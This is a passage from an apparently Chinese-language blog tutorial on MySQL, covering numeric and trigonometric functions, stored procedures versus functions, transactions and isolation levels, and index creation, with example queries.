class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">FLOOR</span>(<span class="number">1.23</span>); -&gt; 1 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">FLOOR</span>(<span class="number">-1.23</span>); -&gt; -2</span><br></pre></td></tr></table></figure><p>注意，返回值被转换为一个 <code>BIGINT</code>！</p></li><li><p><code>CEILING(X)</code>：返回不小于 <code>X</code> 的最小整数：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT CEILING(<span class="number">1.23</span>); -&gt; <span class="number">2</span> </span><br><span class="line">mysql&gt; SELECT CEILING(<span class="number">-1.23</span>); -&gt; <span class="number">-1</span></span><br></pre></td></tr></table></figure><p>注意，返回值被转换为一个 <code>BIGINT</code>！</p></li><li><p><code>ROUND(X)</code></p></li><li><p><code>ROUND(X,D)</code>将参数 <code>X</code> 四舍五入到最近的整数，然后返回。两个参数的形式是将一个数字四舍五入到 <code>D</code> 个小数后返回。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">ROUND</span>(<span class="number">-1.23</span>); -&gt; -1 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">ROUND</span>(<span class="number">-1.58</span>); -&gt; -2 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">ROUND</span>(<span class="number">1.58</span>); -&gt; 2 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">ROUND</span>(<span class="number">1.298</span>, <span class="number">1</span>); -&gt; 1.3 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">ROUND</span>(<span class="number">1.298</span>, <span class="number">0</span>); -&gt; 1</span><br></pre></td></tr></table></figure><p>注意，当参数在两个整数之间时， <code>ROUND()</code> 的行为取决于 C 库的实现。某些取整到最近的偶数，总是向下取，总是向上取，也可能总是接近于零。如果你需要某种取整类型，应该使用一个明确定义的函数比如 <code>TRUNCATE()</code> 或 <code>FLOOR()</code> 代替。</p></li><li><p><code>DIV</code>整除：类似于 <code>FLOOR()</code>，但是它可安全地用于 <code>BIGINT</code> 值。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT <span class="number">5</span> DIV <span class="number">2</span> -&gt; <span class="number">2</span></span><br></pre></td></tr></table></figure><p><code>DIV</code> 在 MySQL 4.1.0 中新加入。</p></li><li><p><code>EXP(X)</code>：返回值 <code>e</code> (自然对数的底) 的 <code>X</code> 次方：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">EXP</span>(<span class="number">2</span>); -&gt; 7.389056 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">EXP</span>(<span class="number">-2</span>); -&gt; 0.135335</span><br></pre></td></tr></table></figure></li><li><p><code>LN(X)</code>返回 <code>X</code> 的自然对数：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">LN</span>(<span class="number">2</span>); -&gt; 0.693147 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">LN</span>(<span class="number">-2</span>); -&gt; NULL</span><br></pre></td></tr></table></figure><p>这个函数在 MySQL 4.0.3 被新加入。在 MySQL 中，它是 <code>LOG(X)</code> 的同义词。</p></li><li><p><code>LOG(X)</code></p></li><li><p><code>LOG(B,X)</code>：如果以一个参数调用，它返回 <code>X</code> 的自然对数。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">LOG</span>(<span class="number">2</span>); -&gt; 0.693147 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">LOG</span>(<span class="number">-2</span>); -&gt; NULL</span><br></pre></td></tr></table></figure><p>如果以两个参数调用，这个函数返回 <code>X</code> 任意底 <code>B</code> 的对数：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">LOG</span>(<span class="number">2</span>,<span class="number">65536</span>); -&gt; 16.000000 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">LOG</span>(<span class="number">1</span>,<span class="number">100</span>); -&gt; NULL</span><br></pre></td></tr></table></figure><p>任意底选项在 MySQL 4.0.3 中被加入。<code>LOG(B,X)</code> 等价于 <code>LOG(X)/LOG(B)</code>。</p></li><li><p><code>LOG2(X)</code>：返回 <code>X</code> 的以 2 为底的对数：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="meta">SELECT</span><span class="meta"> LOG2(</span>65536); -&gt; 16.000000</span><br><span class="line">mysql&gt; <span class="meta">SELECT</span><span class="meta"> LOG2(</span>-100); -&gt; <span class="meta">NULL</span></span><br></pre></td></tr></table></figure><p><code>LOG2()</code> 通常可以用于计数出一个数字需要多少个比特位用于存储它。这个函数在 MySQL 4.0.3 中被添加。在更早的版本中，可以使用 <code>LOG(X)/LOG(2)</code> 来代替它。</p></li><li><p><code>LOG10(X)</code>：返回 <code>X</code> 以 10 为底的对数：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="meta">SELECT</span><span class="meta"> LOG10(</span>2); -&gt; 0.301030 </span><br><span class="line">mysql&gt; <span class="meta">SELECT</span><span class="meta"> LOG10(</span>100); -&gt; 2.000000 </span><br><span class="line">mysql&gt; <span class="meta">SELECT</span><span class="meta"> LOG10(</span>-100); -&gt; <span class="meta">NULL</span></span><br></pre></td></tr></table></figure></li><li><p><code>POW(X,Y)</code></p></li><li><p><code>POWER(X,Y)</code>：返回 <code>X</code> 的 <code>Y</code> 幂：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT POW(<span class="number">2</span>,<span class="number">2</span>); -&gt; <span class="number">4.000000</span> </span><br><span class="line">mysql&gt; SELECT POW(<span class="number">2</span>,<span class="number">-2</span>); -&gt; <span class="number">0.250000</span></span><br></pre></td></tr></table></figure></li><li><p><code>SQRT(X)</code>：返回 <code>X</code> 的非否平方根：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">SQRT</span>(<span class="number">4</span>); -&gt; 2.000000 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">SQRT</span>(<span class="number">20</span>); -&gt; 4.472136</span><br></pre></td></tr></table></figure></li><li><p><code>PI()</code>：返回 PI 值(圆周率)。缺少显示 5 位小数，但是在 MySQL 内部，为 PI 使用全部的双精度。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">PI</span>(); -&gt; 3.141593 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">PI</span>()+<span class="number">0.000000000000000000</span>; -&gt; 3.141592653589793116</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><code>COS(X)</code>：返回 <code>X</code> 的余弦，在这里，<code>X</code> 以弧度给出。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">COS</span>(<span class="built_in">PI</span>()); -&gt; -1.000000</span><br></pre></td></tr></table></figure></li><li><p><code>SIN(X)</code>：返回 <code>X</code> 的正弦，在这里，<code>X</code> 以弧度给出。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">SIN</span>(<span class="built_in">PI</span>()); -&gt; 0.000000</span><br></pre></td></tr></table></figure></li><li><p><code>TAN(X)</code>：返回 <code>X</code> 的正切，在这里，<code>X</code> 以弧度给出。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">TAN</span>(<span class="built_in">PI</span>()+<span class="number">1</span>); -&gt; 1.557408</span><br></pre></td></tr></table></figure></li><li><p><code>ACOS(X)</code>：返回 <code>X</code> 的反余弦，更确切地说，返回余弦值为 <code>X</code> 的值。如果 <code>X</code> 不在 <code>-1</code> 到 <code>1</code> 之间的范围内，返回 <code>NULL</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">ACOS</span>(<span class="number">1</span>); -&gt; 0.000000 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">ACOS</span>(<span class="number">1.0001</span>); -&gt; NULL </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">ACOS</span>(<span class="number">0</span>); -&gt; 1.570796</span><br></pre></td></tr></table></figure></li><li><p><code>ASIN(X)</code>：返回 <code>X</code> 的反正弦，更确切地说，返回正弦值为 <code>X</code> 的值。如果 <code>X</code> 不在 <code>-1</code> 到 <code>1</code> 之间的范围内，返回 <code>NULL</code>：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">ASIN</span>(<span class="number">0.2</span>); -&gt; 0.201358 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">ASIN</span>(<span class="string">'foo'</span>); -&gt; 0.000000</span><br></pre></td></tr></table></figure></li><li><p><code>ATAN(X)</code>：返回 <code>X</code> 的反正切，更确切地说，返回正切值为 <code>X</code> 的值：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">ATAN</span>(<span class="number">2</span>); -&gt; 1.107149 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">ATAN</span>(<span class="number">-2</span>); -&gt; -1.107149</span><br></pre></td></tr></table></figure></li><li><p><code>ATAN(Y,X)</code></p></li><li><p><code>ATAN2(Y,X)</code>：返回两个变量 <code>X</code> 和 <code>Y</code> 的反正切。它类似于计算 <code>Y / X</code> 的反正切，除了两个参数的符号用于决定结果的象限：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">ATAN</span>(<span class="number">-2</span>,<span class="number">2</span>); -&gt; -0.785398 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">ATAN2</span>(<span class="built_in">PI</span>(),<span class="number">0</span>); -&gt; 1.570796</span><br></pre></td></tr></table></figure></li><li><p><code>COT(X)</code>：返回 <code>X</code> 的余切：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> COT(<span class="number">12</span>); -&gt; <span class="number">-1.57267341</span> </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> COT(<span class="number">0</span>); -&gt; <span class="keyword">NULL</span></span><br></pre></td></tr></table></figure></li><li><p><code>RAND()</code></p></li><li><p><code>RAND(N)</code>：返回一个范围在 <code>0</code> 到 <code>1.0</code> 之间的随机浮点值。如果一个整数参数 <code>N</code> 被指定，它被当做种子值使用(用于产生一个可重复的数值)</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> RAND(); -&gt; 0.9233482386203 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> RAND(<span class="number">20</span>); -&gt; 0.15888261251047 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> RAND(<span class="number">20</span>); -&gt; 0.15888261251047 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> RAND(); -&gt; 0.63553050033332 </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> RAND(); -&gt; 0.70100469486881</span><br></pre></td></tr></table></figure><p>在一个 <code>ORDER BY</code> 子句中，不可以使用 <code>RAND()</code> 值使用一个列，因为 <code>ORDER BY</code> 将多次重复计算列。从 MySQL 3.23 开始，你可以使用：<code>SELECT * FROM table_name ORDER BY RAND()</code>，这有利于得到一个来自 <code>SELECT * FROM table1,table2 WHERE a=b AND c&lt;d ORDER BY RAND() LIMIT 1000</code> 的集合中的随机样本。 注意，在一个 <code>WHERE</code> 子句中的 <code>RAND()</code> 将在每次 <code>WHERE</code> 执行时被重新计算。 <code>RAND()</code> 并不是预期完美的随机数发生器，但是可以代替做为产生特别的随机数一个快速的方法，这样便于在两个不同平台下的同一 MySQL 版本间移动。</p></li><li><p><code>LEAST(X,Y,...)</code></p><p>有两个或更多个参数，返回最小(最小值)的参数。参数使用下列规则进行比较：如果返回值用于一个 <code>INTEGER</code> 语境，或所有的参数是整数值，它们作为整数比较。如果返回值用于一个 <code>REAL</code> 语境，或所有的参数均是实数值，它们作为实数被比较。如果任何一个参数是字母大小写敏感的，参数作为大小写敏感的字符串进行比较。在其它情况下，参数做为忽略大小写的字符中进行比较</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT LEAST(<span class="number">2</span>,<span class="number">0</span>); -&gt; <span class="number">0</span> </span><br><span class="line">mysql&gt; SELECT LEAST(<span class="number">34.0</span>,<span class="number">3.0</span>,<span class="number">5.0</span>,<span class="number">767.0</span>); -&gt; <span class="number">3.0</span> </span><br><span class="line">mysql&gt; SELECT LEAST(<span class="string">"B"</span>,<span class="string">"A"</span>,<span class="string">"C"</span>); -&gt; <span class="string">"A"</span></span><br></pre></td></tr></table></figure><p>在早于 MySQL 3.22.5 的版本中，你可以使用 <code>MIN()</code> 代替 <code>LEAST</code>。</p></li><li><p><code>GREATEST(X,Y,...)</code>：返回最大(最大值)参数。参数使用与 <code>LEAST</code> 一致的规则进行比较：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT GREATEST(<span class="number">2</span>,<span class="number">0</span>); -&gt; <span class="number">2</span> </span><br><span class="line">mysql&gt; SELECT GREATEST(<span class="number">34.0</span>,<span class="number">3.0</span>,<span class="number">5.0</span>,<span class="number">767.0</span>); -&gt; <span class="number">767.0</span> </span><br><span class="line">mysql&gt; SELECT GREATEST(<span class="string">"B"</span>,<span class="string">"A"</span>,<span class="string">"C"</span>); -&gt; <span class="string">"C"</span></span><br></pre></td></tr></table></figure><p>在早于 MySQL 3.22.5 的版本中，可以使用 <code>MAX()</code> 代替 <code>GREATEST</code>。</p></li><li><p><code>DEGREES(X)</code>：将参数 <code>X</code> 从弧度转换为角度，然后返回：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">DEGREES</span>(<span class="built_in">PI</span>()); -&gt; 180.000000</span><br></pre></td></tr></table></figure></li><li><p><code>RADIANS(X)</code>：将参数 <code>X</code> 从角度转换为弧度，然后返回：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> <span class="built_in">RADIANS</span>(<span class="number">90</span>); -&gt; 1.570796</span><br></pre></td></tr></table></figure></li><li><p><code>TRUNCATE(X,D)</code>：将数值 <code>X</code> 截到 <code>D</code> 个小数，然后返回。如果 <code>D</code> 为 <code>0</code>，结果将不包含小数点和小数部分：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT TRUNCATE(<span class="number">1.223</span>,<span class="number">1</span>); -&gt; <span class="number">1.2</span> </span><br><span class="line">  mysql&gt; SELECT TRUNCATE(<span class="number">1.999</span>,<span class="number">1</span>); -&gt; <span class="number">1.9</span> </span><br><span class="line">  mysql&gt; SELECT TRUNCATE(<span class="number">1.999</span>,<span class="number">0</span>); -&gt; <span class="number">1</span> </span><br><span class="line">  mysql&gt; SELECT TRUNCATE(<span class="number">-1.999</span>,<span class="number">1</span>); -&gt; <span class="number">-1.9</span></span><br></pre></td></tr></table></figure><p>从 MySQL 3.23.51 开始，所有数字被四舍五入到零。 如果 <code>D</code> 是负数，那么数字的整个部分被对准零位输出：<code>mysql&gt; SELECT TRUNCATE(122,-2); -&gt; 100</code>注意，十进值小数在计算机中通常不以精确数字存储，而是双精度型的值，你可能会被下列结果所愚弄：<code>mysql&gt; SELECT TRUNCATE(10.28*100,0); -&gt; 1027</code>上面结果的发生是因为 10.28 实际上是以某些像 10.2799999999999999 的形式被存储的。</p></li></ul><h4><span id="存储过程和函数区别">存储过程和函数区别</span></h4><p>一般来说，存储过程实现的功能要复杂一点，而函数的实现的功能针对性比较强。 存储过程，功能强大，可以执行包括修改表等一系列数据库操作；用户定义函数不能用于执行一组修改全局数据库状态的操作。</p><p>① 存储过程<strong>必须使用CALL调用，而存储函数不用。</strong></p><p>② 对于存储过程来说<strong>可以返回参数，如记录集，而函数只能返回值或者表对象</strong>。函数只能<strong>返回一个变量</strong>；而存储过程<strong>可以返回多个</strong>。</p><p>③ 存储过程的参数可以有<strong>IN,OUT,INOUT三种类型</strong>，而函数只能有<strong>IN类型</strong>。存储过程<strong>声明时不需要返回类型</strong>，而函数声明时<strong>需要描述返回类型</strong>，且函数体中<strong>必须包含一个有效的RETURN语句</strong>。</p><p>④ 存储过程一般是作为一个<strong>独立的部分来执行</strong>（ EXECUTE 语句执行），而函数可以作为<strong>查询语句的一个部分</strong>来调用（SELECT调用），<br>由于函数可以返回一个表对象，因此它可以在查询语句中位于FROM关键字的后面。 <strong>SQL语句中不可用存储过程，而可以使用函数</strong></p><h3><span id="事务">事务</span></h3><p>由用户自定义的一系列数据库更新操作，这些操作要么都不执行，要么都执行，是一个不可分割的逻辑工作单元，若执行到事务一半而出现意外，则会将数据回滚到事务发生之前。</p><h4><span id="事务处理语句">事务处理语句</span></h4><p>启动事务</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">start</span> <span class="keyword">transaction</span>;</span><br></pre></td></tr></table></figure><p>启动事务之后，开始执行事务内的sql语句，sql语句执行完毕后，必须提交事务，才能使事务中的操作永久生效。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">commit</span>;<span class="comment">#提交事务</span></span><br></pre></td></tr></table></figure><p>当事务在执行过程中发生错误，事务中的所有操作都要取消，返回事务执行之前，这就是回滚事务</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ROLLBACK</span>;<span class="comment">#回滚事务</span></span><br></pre></td></tr></table></figure><p>事务的特性具有原子性、一致性、隔离性以及持久性。</p><p>原子性：事务是一个不可分割的逻辑工作单元。要么事务内操作全部执行，要么全部不执行。</p><p>一致性：事务发生前后数据始终保持一致。</p><p>隔离性：多个事务一起执行，相互间不干扰。</p><p>持久性：事务对数据库的数据修改将永久生效。</p><p>另外，事务并不能在存储函数和触发器中使用。</p><p>例如在存储过程中添加两条公寓信息，使用事务插入一条数据和不使用事务插入一条数据。</p><h4><span id="事务隔离">事务隔离</span></h4><p>数据库访问采用的是并发的访问，多线程访问数据库时，可能出现脏读、幻读和不可重复读等多线程问题。</p><p>①脏读就是一个事务读取了另一个事务没有提交的数据。如果另一个事务回滚，则读到的就是脏数据。</p><p>②不可重复读就是一个事务内，对同一数据进行两次相同查询，得到的结果不一致。</p><p>③幻读就是在同一事务中，两次相同条件查询到的记录不一样。</p><p>因此为了避免上述三种情况的发生，设置了四种隔离级别,由低到高。</p><p>READ UNCOMMITTED:该级别下的事务可以读取另一个未提交事务的数据。实际情况很容易出现脏读，很少被应用。</p><p>READ COMMITTED: 该级别下的事务只能读取已经提交的数据。</p><p>REPEATABLE READ:mysql默认的事务隔离级别，确保同一事务的多个实例并发读取数据读到一样的数据，但是这种隔离级别容易出现幻读。</p><p>SERIALIZABLE:最高隔离级别，通过对事务强制性排序，使事务之间不会冲突，从而解决幻读。但是容易出现超时和锁竞争问题。</p><table><thead><tr><th align="center">隔离级别</th><th align="center">脏读</th><th align="center">不可重复读</th><th align="center">幻读</th></tr></thead><tbody><tr><td align="center">READ UNCOMMITTED</td><td align="center">✔</td><td align="center">✔</td><td align="center">✔</td></tr><tr><td align="center">READ COMMITTED</td><td align="center">❌</td><td align="center">✔</td><td align="center">✔</td></tr><tr><td align="center">REPEATABLE READ</td><td align="center">❌</td><td align="center">❌</td><td align="center">✔</td></tr><tr><td align="center">SERIALIZABLE</td><td align="center">❌</td><td align="center">❌</td><td align="center">❌</td></tr></tbody></table><p>在事务中，如下可以改变该事务的隔离级别</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> [<span class="keyword">SESSION</span>|<span class="keyword">GLOBAL</span>] <span class="keyword">TRANSACTION</span> <span class="keyword">ISOLATION</span> <span class="keyword">LEVEL</span> &#123;<span class="keyword">READ</span> UNCOMMITTED|<span class="keyword">READ</span> COMMITTED|REPEATABLE <span class="keyword">READ</span>|<span class="keyword">SERIALIZABLE</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="索引">索引</span></h3><p>为搜索条件的字段上创建了索引，mysql在查找时，无需扫描任何记录即可迅速得到目标记录所在位置，能够大大提高查找效率。</p><p>如果数据表是一本书，索引就是目录。</p><p>索引特性：</p><p>① 唯一索引可以保证数据记录的唯一性</p><p>② 可以加快数据的检索速度</p><p>③ 可以加快表与表之间的连接。在实现数据的参照完整性方面有特别的意义</p><p>④ 在使用order by 和group by子句进行数据检索时，可以显著减少查询中分组和排序的时间。</p><p>⑤ 检索数据的过程中使用优化隐藏器，可以提高系统性能。</p><p>索引分类：</p><p>① 普通索引：由KEY或INDEX定义的索引，mysql中的基本索引类型，允许在定义索引的字段中插入重复值空值。</p><p>② 唯一索引：由UNIQUE定义的索引，指索引字段的值必须唯一，但允许有空值。如果是多个字段建立的组合索引，字段值的组合必须唯一。在创建主键或唯一约束的字段上会自动创建唯一索引。主键索引是一种特殊的唯一索引，不允许有空值。</p><p>③ 全文索引：由FULLTEXT定义的索引，指在定义索引的字段上支持值的全文查找。该索引类型允许在索引字段上插入重复值和空值。他只能创建在CHAR、VARCHAR、TEXT类型的字段上。</p><p>④ 空间索引：由SPATIAL定义的索引，是只能在空间数据类型的字段上建立的索引。空间数据类型有四种分别为GEOMETRY、POINT、LINESTRING和POLYGON。需要注意的是，创建空间索引的字段，必须将其声明为NOT NULL。</p><p>⑤单个索引：单个字段上创建的索引。它可以是普通索引、唯一索引、或者全文索引。</p><p>⑥多列索引：在表中多个字段上创建的索引。</p><p>索引设计原则：</p><p>①索引并非越多越好</p><p>②避免对经常更新的表建立过多的索引，并且索引字段尽可能少</p><p>③数据量小的表最好不要使用索引</p><p>④不同值较少的字段不要建立索引字段 </p><p>⑤为经常需要进行排序、分组和连接查询的字段建立索引</p><h4><span id="创建索引">创建索引</span></h4><h5><span id="在创建表时">在创建表时</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(字段名 数据类型 [完整性条件约束],.......,[<span class="keyword">UNIQUE</span>|FULLTEXT|SPATIAL] <span class="keyword">INDEX</span>|<span class="keyword">KEY</span> [索引名](字段名 [<span class="keyword">ASC</span>|<span class="keyword">DESC</span>]))</span><br></pre></td></tr></table></figure><p>[]中的字段为可选</p><p>例如 创建一个学生表有学号、姓名、性别、电话字段。学号为int类型、姓名为varchar(10)、性别为enum(‘男’、’女’)、电话为int(11)。其中为电话添加唯一索引且别名为telephone，学号为主键约束。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(学号 <span class="built_in">int</span> PRIMARY <span class="keyword">KEY</span>, 姓名 <span class="built_in">varchar</span>(<span class="number">10</span>) <span class="built_in">character</span> <span class="keyword">set</span> utf8 <span class="keyword">NOT</span> <span class="literal">NULL</span>, 性别 enum(<span class="string">'男'</span>,<span class="string">'女'</span>) <span class="built_in">character</span> <span class="keyword">set</span> utf8 <span class="keyword">NOT</span> <span class="literal">NULL</span>,电话 <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>, <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> telephone(电话));</span><br></pre></td></tr></table></figure><p><img src="./image-20220307171305731.png" alt="image-20220307171305731"></p><p>例如创建course表有课程号、教师号、课程名、教师名、教室字段。课程号和教师号为int类型，剩下字段为text类型。创建课程号和教师号为唯一索引的多列索引。该多列索引的别名为name</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> course(课程号 <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>, 教师号 <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>, 课程名 <span class="built_in">text</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8 <span class="keyword">NOT</span> <span class="literal">NULL</span>,教师名 <span class="built_in">text</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8 <span class="keyword">NOT</span> <span class="literal">NULL</span>,教师 <span class="built_in">text</span> <span class="built_in">character</span> <span class="keyword">set</span> utf8 <span class="keyword">NOT</span> <span class="literal">NULL</span>, <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> <span class="keyword">name</span>(课程号,教师号));</span><br></pre></td></tr></table></figure><p><img src="./image-20220307163412880.png" alt="image-20220307163412880"></p><p>例如创建test表，设置id1、id2、id3、id4、di5全为int类型的字段。且每一个字段为一个唯一索引,索引名为d1、d2、d3、d4、d5。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span>(id1 <span class="built_in">int</span>,id2 <span class="built_in">int</span>,id3 <span class="built_in">int</span>,id4 <span class="built_in">int</span>,id5 <span class="built_in">int</span>,</span><br><span class="line">                  <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> d1(id1),</span><br><span class="line">                  <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> d2(id2),</span><br><span class="line">                  <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> d3(id3),</span><br><span class="line">                  <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> d4(id4),</span><br><span class="line">                  <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> d5(id5));</span><br></pre></td></tr></table></figure><p><img src="./image-20220307171856826.png" alt="image-20220307171856826"></p><h5><span id="在已经存在的表">在已经存在的表</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> [<span class="keyword">UNIQUE</span>|FULLTEXT|SPATIAL] <span class="keyword">INDEX</span> 索引名 <span class="keyword">ON</span> 表名(表中字段名[(长度)]);</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> [<span class="keyword">UNIQUE</span>|FULLTEXT|SPATIAL] <span class="keyword">INDEX</span> 索引名(表中字段名[(长度)] [<span class="keyword">ASC</span>|<span 